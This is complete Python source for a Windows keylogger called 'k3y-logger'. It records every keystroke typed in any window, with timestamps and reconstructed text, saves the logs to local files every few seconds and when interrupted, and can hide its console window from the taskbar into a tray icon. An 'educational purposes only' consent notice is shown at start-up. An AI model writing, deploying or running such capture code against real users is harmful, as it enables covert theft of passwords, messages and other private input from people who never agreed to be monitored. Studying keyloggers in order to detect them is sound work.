import pynput
import time
import sys
import os
import re
import threading
import ctypes
import msvcrt
import atexit
import signal
from datetime import datetime

# ══════════════════════════════════════════════════════════
# Capture the REAL terminal window handle IMMEDIATELY
# Must happen before anything else runs
# ══════════════════════════════════════════════════════════
TERMINAL_HWND = ctypes.windll.user32.GetForegroundWindow()

# Try to import system tray dependencies
try:
    import pystray
    from PIL import Image, ImageDraw

    TRAY_AVAILABLE = True
except ImportError:
    TRAY_AVAILABLE = False

# Log file paths
log_file = "key_log.txt"
partial_log_file = "key_log_partial.txt"

# Stores each keystroke individually with timestamp
keystroke_log = []

# Stores characters for building combined readable text
text_buffer = []

# Tray state
tray_active = False
tray_icon_ref = None

# Session state
session_active = False
session_duration = 0
session_start_time = None
AUTO_SAVE_INTERVAL = 5  # Save partial log every 5 seconds
last_auto_save = 0

# Windows API constants
SW_HIDE = 0
SW_SHOW = 5
SW_RESTORE = 9


# ── Input Helpers ──


def get_key(prompt, valid_keys=None, default=""):
    """Get a single keypress without requiring Enter"""
    sys.stdout.write(prompt)
    sys.stdout.flush()

    while True:
        ch = msvcrt.getwch()

        # Enter key = use default value
        if ch in ("\r", "\n"):
            print(default if default else "")
            return default

        low = ch.lower()
        if valid_keys is None or low in valid_keys:
            print(ch)
            return low


# ── Timestamp & Formatting ──


def get_timestamp():
    now = datetime.now()
    return now.strftime("%Y-%m-%d %H:%M:%S.") + f"{now.microsecond // 1000:03d}"


def format_time(seconds):
    seconds = max(0, int(seconds))
    hrs = seconds // 3600
    mins = (seconds % 3600) // 60
    secs = seconds % 60
    if hrs > 0:
        return f"{hrs:02d}:{mins:02d}:{secs:02d}"
    return f"{mins:02d}:{secs:02d}"


def format_duration_readable(seconds):
    if seconds >= 3600:
        value = seconds / 3600
        unit = "hour" if value == 1 else "hours"
        return f"{value:g} {unit}"
    elif seconds >= 60:
        value = seconds / 60
        unit = "minute" if value == 1 else "minutes"
        return f"{value:g} {unit}"
    unit = "second" if seconds == 1 else "seconds"
    return f"{seconds} {unit}"


def parse_duration(input_str):
    input_str = input_str.strip().lower()
    match = re.match(r"^(\d+\.?\d*)\s*([hms])?$", input_str)
    if not match:
        return None
    value = float(match.group(1))
    unit = match.group(2)
    if unit == "h":
        return max(1, int(value * 3600))
    elif unit == "m":
        return max(1, int(value * 60))
    return max(1, int(value))


def progress_bar(pct, width=30):
    filled = int(width * pct / 100)
    return "█" * filled + "░" * (width - filled)


# ── Window Management ──


def hide_window():
    """Completely hide the terminal window"""
    ctypes.windll.user32.ShowWindow(TERMINAL_HWND, SW_HIDE)


def restore_window():
    """Restore the terminal window and bring to front"""
    ctypes.windll.user32.ShowWindow(TERMINAL_HWND, SW_SHOW)
    ctypes.windll.user32.ShowWindow(TERMINAL_HWND, SW_RESTORE)
    ctypes.windll.user32.SetForegroundWindow(TERMINAL_HWND)


def is_window_minimized():
    """Check if the terminal window is minimized"""
    return bool(ctypes.windll.user32.IsIconic(TERMINAL_HWND))


# ── System Tray ──


def create_tray_image():
    """Create a simple icon for the system tray"""
    image = Image.new("RGBA", (64, 64), (0, 0, 0, 0))
    draw = ImageDraw.Draw(image)
    draw.ellipse([4, 4, 60, 60], fill="#e94560", outline="#ffffff", width=2)
    draw.ellipse([24, 24, 40, 40], fill="#ffffff")
    return image


def on_tray_restore(icon, item):
    """Called when user clicks the tray icon"""
    global tray_active
    tray_active = False
    restore_window()
    icon.stop()


def start_tray():
    """Create and run the system tray icon"""
    global tray_icon_ref

    image = create_tray_image()
    menu = pystray.Menu(
        pystray.MenuItem("Restore", on_tray_restore, default=True),
    )
    tray_icon_ref = pystray.Icon("k3y-logger", image, "Keylogger Active", menu)
    tray_icon_ref.run()


def start_tray_thread():
    """Start the system tray in a separate thread"""
    t = threading.Thread(target=start_tray)
    t.daemon = True
    t.start()
    time.sleep(0.3)  # Give tray time to initialize


# ── Keystroke Capture ──


def log_key(key):
    ts = get_timestamp()

    try:
        char = key.char
        if char is not None:
            keystroke_log.append((ts, char))
            text_buffer.append(char)
    except AttributeError:
        if key == pynput.keyboard.Key.space:
            keystroke_log.append((ts, "[SPACE]"))
            text_buffer.append(" ")
        elif key == pynput.keyboard.Key.enter:
            keystroke_log.append((ts, "[ENTER]"))
            text_buffer.append("\n")
        elif key == pynput.keyboard.Key.tab:
            keystroke_log.append((ts, "[TAB]"))
            text_buffer.append("\t")
        elif key == pynput.keyboard.Key.backspace:
            keystroke_log.append((ts, "[BACKSPACE]"))
            if text_buffer:
                text_buffer.pop()
        elif key in (pynput.keyboard.Key.shift, pynput.keyboard.Key.shift_r):
            pass
        else:
            name = str(key).replace("Key.", "").upper()
            keystroke_log.append((ts, f"[{name}]"))


# ── Log File Writing ──


def write_log(filepath, duration, partial=False):
    """Write log to file. If partial=True, marks it as incomplete."""
    elapsed = 0
    if session_start_time:
        elapsed = time.time() - session_start_time

    try:
        with open(filepath, "w", encoding="utf-8") as f:
            f.write(f"{'='*60}\n")
            if partial:
                f.write(f"  ⚠️  PARTIAL KEYLOGGER SESSION LOG\n")
                f.write(f"  ⚠️  Session was interrupted before completion\n")
            else:
                f.write(f"  KEYLOGGER SESSION LOG\n")
            f.write(f"{'─'*60}\n")
            f.write(
                f"  Date         : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
            )
            f.write(f"  Set Duration : {format_duration_readable(duration)}\n")
            if partial:
                f.write(f"  Ran For      : {format_duration_readable(int(elapsed))}\n")
                f.write(
                    f"  Remaining    : {format_duration_readable(max(0, int(duration - elapsed)))}\n"
                )
                f.write(f"  Status       : INTERRUPTED\n")
            else:
                f.write(f"  Status       : COMPLETED\n")
            f.write(f"  Total Keys   : {len(keystroke_log)}\n")
            f.write(f"{'='*60}\n\n\n")

            f.write(f"{'─'*60}\n")
            f.write(f"  SECTION 1: INDIVIDUAL KEYSTROKE LOG\n")
            f.write(f"{'─'*60}\n\n")

            if keystroke_log:
                for ts, key_data in keystroke_log:
                    f.write(f"  {ts}  │  {key_data}\n")
            else:
                f.write("  (No keystrokes recorded)\n")

            f.write(f"\n\n{'─'*60}\n")
            f.write(f"  SECTION 2: COMBINED TEXT OUTPUT\n")
            f.write(f"{'─'*60}\n\n")

            combined = "".join(text_buffer)
            if combined.strip():
                for line in combined.split("\n"):
                    f.write(f"  {line}\n")
            else:
                f.write("  (No readable text captured)\n")

            f.write(f"\n{'='*60}\n")
            if partial:
                f.write(f"  END OF PARTIAL LOG\n")
            else:
                f.write(f"  END OF LOG\n")
            f.write(f"{'='*60}\n")
        return True
    except Exception:
        return False


def auto_save_partial():
    """Auto-save partial log file periodically"""
    global last_auto_save
    now = time.time()
    if now - last_auto_save >= AUTO_SAVE_INTERVAL and keystroke_log:
        write_log(partial_log_file, session_duration, partial=True)
        last_auto_save = now


def emergency_save():
    """Last resort save on unexpected exit"""
    if session_active and keystroke_log:
        write_log(partial_log_file, session_duration, partial=True)


# Register emergency save for unexpected exits
atexit.register(emergency_save)


# ── Signal Handler ──


def handle_interrupt(signum, frame):
    """Handle Ctrl+C and other interrupts"""
    global session_active, tray_active, tray_icon_ref

    if not session_active:
        sys.exit(0)

    session_active = False

    # Restore window if in tray
    if tray_active:
        tray_active = False
        if tray_icon_ref:
            try:
                tray_icon_ref.stop()
            except Exception:
                pass
        restore_window()

    # Save partial log
    if keystroke_log:
        elapsed = 0
        if session_start_time:
            elapsed = time.time() - session_start_time

        print(f"\n\n  ╔════════════════════════════════════════════════════╗")
        print(f"  ║  ⚠️  SESSION INTERRUPTED                           ║")
        print(f"  ╠════════════════════════════════════════════════════╣")
        print(f"  ║  Saving captured data to partial log...            ║")
        print(f"  ╚════════════════════════════════════════════════════╝")

        write_log(partial_log_file, session_duration, partial=True)

        print(f"\n  Ran for: {format_duration_readable(int(elapsed))}")
        print(f"  Keys captured: {len(keystroke_log)}")
        print(f"  Partial log: {os.path.abspath(partial_log_file)}")
        print(f"  Previous complete log preserved: {log_file}\n")
    else:
        print(f"\n\n  Session interrupted. No keystrokes were captured.\n")

    ctypes.windll.kernel32.SetConsoleTitleW("k3y-logger │ Interrupted")
    os._exit(0)


# Register signal handlers
signal.signal(signal.SIGINT, handle_interrupt)
signal.signal(signal.SIGBREAK, handle_interrupt)


# ── User Interface ──


def show_disclaimer():
    print()
    print("  ╔════════════════════════════════════════════════════╗")
    print("  ║           ETHICAL KEYLOGGER NOTICE                 ║")
    print("  ╠════════════════════════════════════════════════════╣")
    print("  ║  This program is for educational purposes only.    ║")
    print("  ║  You must obtain permission before using it.       ║")
    print("  ╠════════════════════════════════════════════════════╣")
    print("  ║  By using this software, you agree to:             ║")
    print("  ║  1. You have permission to log keystrokes.         ║")
    print("  ║  2. You will not use it to break any laws.         ║")
    print("  ║  3. You are responsible for data collected.        ║")
    print("  ╚════════════════════════════════════════════════════╝")

    key = get_key("\n  Do you accept these terms? (y/n): ", valid_keys=["y", "n"])
    if key != "y":
        print("\n  You must agree to the terms to use this program.")
        sys.exit()


def ask_hide_to_tray():
    """Ask user if they want minimize-to-tray. Enter = no"""
    key = get_key(
        "  Hide from taskbar on minimize? (y/n) [n]: ",
        valid_keys=["y", "n"],
        default="n",
    )
    if key == "y":
        if not TRAY_AVAILABLE:
            print()
            print("  ╔════════════════════════════════════════════════════╗")
            print("  ║  ⚠️  System tray requires additional packages:    ║")
            print("  ║     pip install pystray Pillow                    ║")
            print("  ║  Continuing without tray support...               ║")
            print("  ╚════════════════════════════════════════════════════╝")
            print()
            return False
        return True
    return False


def get_duration():
    print("\n  Enter logging duration:")
    print("  Examples: 30 (seconds) | 5m (minutes) | 1.5h (hours)")
    raw = input("\n  Duration: ").strip()

    dur = parse_duration(raw)
    if dur is None or dur <= 0:
        print("\n  Invalid input! Examples: 60, 5m, 1.5h")
        sys.exit()
    return dur


# ── Main ──


def start_keylogger():
    global tray_active, tray_icon_ref
    global session_active, session_duration, session_start_time, last_auto_save

    show_disclaimer()
    hide_to_tray = ask_hide_to_tray()
    duration = get_duration()
    readable = format_duration_readable(duration)

    # Store session info globally for interrupt handler
    session_duration = duration
    session_active = True

    print(f"\n  Logging for {readable}. Switch to any other window and type!")
    print(f"  Log file         : {log_file}")
    print(f"  Partial log file : {partial_log_file}")
    if hide_to_tray:
        print(f"  📌 Minimize this window to send it to the system tray.")
        print(f"  📌 Double-click the tray icon to restore.")
    print(f"  💾 Auto-saving partial log every {AUTO_SAVE_INTERVAL} seconds.")
    print(f"  ⛔ Press Ctrl+C to stop early (partial log will be saved).")
    print()

    with pynput.keyboard.Listener(on_press=log_key) as listener:
        session_start_time = time.time()
        last_auto_save = session_start_time

        while time.time() - session_start_time < duration:
            elapsed = time.time() - session_start_time
            remaining = duration - elapsed
            pct = min((elapsed / duration) * 100, 100)
            bar = progress_bar(pct)
            keys = len(keystroke_log)

            # Always update window title with timer
            ctypes.windll.kernel32.SetConsoleTitleW(
                f"k3y-logger │ {format_time(remaining)} remaining │ Keys: {keys}"
            )

            # Only update terminal progress bar when visible
            if not tray_active:
                sys.stdout.write(
                    f"\r  ⏱  {format_time(remaining)}  │{bar}│ {pct:5.1f}%  │  Keys: {keys}  "
                )
                sys.stdout.flush()

            # Detect minimize and send to tray
            if hide_to_tray and not tray_active and is_window_minimized():
                tray_active = True
                hide_window()
                start_tray_thread()

            # Update tray tooltip with live stats
            if tray_active and tray_icon_ref:
                tray_icon_ref.title = (
                    f"k3y-logger │ {format_time(remaining)} │ Keys: {keys}"
                )

            # Auto-save partial log periodically
            auto_save_partial()

            time.sleep(0.5)

        # ── Timer finished (normal completion) ──

        session_active = False

        # Restore from tray if hidden
        if tray_active:
            tray_active = False
            if tray_icon_ref:
                tray_icon_ref.stop()
            restore_window()

        # Final progress line
        total = len(keystroke_log)
        sys.stdout.write(
            f"\r  ☑ {format_time(0)}   │{'█' * 30}│ 100.0%  │  Keys: {total}  \n"
        )
        sys.stdout.flush()
        listener.stop()

    # Write both files on completion
    write_log(log_file, duration, partial=False)
    write_log(partial_log_file, duration, partial=False)

    ctypes.windll.kernel32.SetConsoleTitleW("k3y-logger │ Complete")

    print(f"\n  Logging complete! Total keystrokes: {len(keystroke_log)}")
    print(f"  Complete log : {os.path.abspath(log_file)}")
    print(f"  Partial log  : {os.path.abspath(partial_log_file)}\n")


if __name__ == "__main__":
    start_keylogger()
